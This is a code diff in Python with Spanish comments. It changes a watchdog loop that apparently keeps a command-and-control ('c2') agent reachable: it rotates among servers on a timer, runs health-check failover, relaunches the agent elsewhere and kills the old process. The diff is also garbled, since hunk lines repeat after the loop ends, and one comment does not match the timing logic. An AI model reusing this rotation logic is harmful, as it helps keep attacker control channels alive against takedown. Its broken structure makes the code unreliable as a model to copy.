@@ -137,8 +137,15 @@ def start_watchdog():
         redis_port  = int(os.getenv("REDIS_PORT", 6379))
         current_srv = os.getenv("CURRENT_SERVER", "")
 
+        # Agregar path de plugins
+        agent_dir = os.path.dirname(os.path.abspath(__file__))
+        if agent_dir not in sys.path:
+            sys.path.insert(0, agent_dir)
+
         # Dar tiempo al agente para conectarse antes de monitorear
-        time.sleep(30)
+        time.sleep(15)
+        print(f"\n[Watchdog] Iniciado. Servidor: {current_srv or 'desconocido'}")
+        print("> ", end="", flush=True)
 
         while True:
             try:
@@ -153,31 +160,128 @@ def start_watchdog():
                     )
                     r.ping()
                 except Exception:
-                    # Redis no disponible, no podemos hacer nada
                     time.sleep(30)
                     continue
 
                 # ------------------------------------------------
                 # VERIFICAR ROTACIÓN AUTOMÁTICA
                 # ------------------------------------------------
-                auto_on    = r.get("config:auto_rotation") == "1"
-                next_rot   = r.get("c2:next_rotation")
+                auto_on  = r.get("config:auto_rotation") == "1"
+                next_rot = r.get("c2:next_rotation")
 
                 if auto_on and next_rot:
                     try:
                         next_ts = float(next_rot)
-                        if time.time() >= next_ts:
-                            print(f"\n[⏱️] Rotación automática programada")
+                        remaining = next_ts - time.time()
+                        
+                        # Mostrar cuenta regresiva cada 10 minutos
+                        if 0 < remaining <= 60:
+                            print(f"\n[Watchdog] ⏱️ Rotación en {int(remaining)}s")
                             print("> ", end="", flush=True)
 
-                            # Importar plugin y ejecutar rotación
-                            sys.path.insert(0, os.path.dirname(__file__))
+                        if time.time() >= next_ts:
+                            print(f"\n[Watchdog] ⏱️ Ejecutando rotación automática...")
+                            print("> ", end="", flush=True)
+
                             from plugins.rotate_server import (
                                 get_available_servers, get_next_server,
                                 launch_new_agent, log_event
                             )
 
                             servers = get_available_servers(r)
+                            target  = get_next_server(r, current_srv, servers)
+
+                            if target and target['name'] != current_srv:
+                                success, msg = launch_new_agent(
+                                    target['url'], redis_host, str(redis_port),
+                                    target['name']
+                                )
+                                if success:
+                                    import json
+                                    log_event(r, "auto_rotation", {
+                                        "from": current_srv,
+                                        "to": target['name']
+                                    })
+                                    r.set("c2:active_server", target['name'])
+                                    r.setex("agent:last_rotation", 600, json.dumps({
+                                        "from": current_srv,
+                                        "to": target['name'],
+                                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
+                                    }))
+                                    # Actualizar próxima rotación
+                                    interval = int(r.get("config:rotation_interval") or 90)
+                                    r.set("c2:next_rotation", str(time.time() + interval * 60))
+                                    
+                                    print(f"\n[Watchdog] ✅ Rotado a {target['name']}")
+                                    print("> ", end="", flush=True)
+                                    time.sleep(5)
+                                    os._exit(0)
+                                else:
+                                    print(f"\n[Watchdog] ❌ Error en rotación: {msg}")
+                                    print("> ", end="", flush=True)
+                            else:
+                                # Mismo servidor o no hay alternativa, actualizar timestamp
+                                interval = int(r.get("config:rotation_interval") or 90)
+                                r.set("c2:next_rotation", str(time.time() + interval * 60))
+
+                    except Exception as e:
+                        print(f"\n[Watchdog] Error en rotación: {e}")
+                        print("> ", end="", flush=True)
+
+                # ------------------------------------------------
+                # VERIFICAR SALUD DEL SERVIDOR ACTUAL
+                # ------------------------------------------------
+                if SERVER_URL:
+                    try:
+                        import requests as req
+                        resp = req.get(f"{SERVER_URL}/health", timeout=8)
+                        if resp.status_code != 200:
+                            raise Exception(f"HTTP {resp.status_code}")
+
+                    except Exception as health_err:
+                        print(f"\n[Watchdog] ⚠️ Servidor {current_srv} no responde: {health_err}")
+                        print(f"[Watchdog] → Iniciando failover...")
+                        print("> ", end="", flush=True)
+
+                        try:
+                            from plugins.rotate_server import (
+                                get_available_servers, launch_new_agent, log_event
+                            )
+                            import json
+
+                            servers = get_available_servers(r)
+                            others  = [s for s in servers if s['name'] != current_srv]
+
+                            if others:
+                                target = others[0]
+                                log_event(r, "failover", {
+                                    "failed_server": current_srv,
+                                    "new_server": target['name']
+                                })
+                                success, msg = launch_new_agent(
+                                    target['url'], redis_host, str(redis_port),
+                                    target['name']
+                                )
+                                if success:
+                                    r.set("c2:active_server", target['name'])
+                                    print(f"\n[Watchdog] ✅ Failover: {current_srv} → {target['name']}")
+                                    print("> ", end="", flush=True)
+                                    time.sleep(5)
+                                    os._exit(0)
+                                else:
+                                    print(f"\n[Watchdog] ❌ Failover fallido: {msg}")
+                                    print("> ", end="", flush=True)
+                            else:
+                                print(f"\n[Watchdog] ❌ No hay servidores alternativos")
+                                print("> ", end="", flush=True)
+                        except Exception as fe:
+                            print(f"\n[Watchdog] Error en failover: {fe}")
+                            print("> ", end="", flush=True)
+
+            except Exception as e:
+                pass  # Watchdog nunca debe crashear
+
+            time.sleep(30)
                             target  = get_next_server(r, current_srv, servers)
 
                             if target and target['name'] != current_srv:
